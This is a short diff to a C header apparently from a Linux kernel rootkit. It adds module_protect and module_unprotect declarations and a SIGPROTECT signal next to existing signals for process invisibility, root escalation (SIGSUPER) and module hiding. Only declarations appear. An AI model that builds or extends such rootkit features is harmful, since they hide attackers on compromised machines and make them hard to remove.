@@ -16,6 +16,12 @@ void
 module_show(void);
 
 void
+module_protect(void);
+
+void
+module_unprotect(void);
+
+void
 module_hide(void);
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -41,6 +47,7 @@ struct linux_dirent {
 enum {
 	SIGINVIS = 31,
 	SIGSUPER = 64,
+  SIGPROTECT = 62,
 	SIGMODINVIS = 63,
 };
 
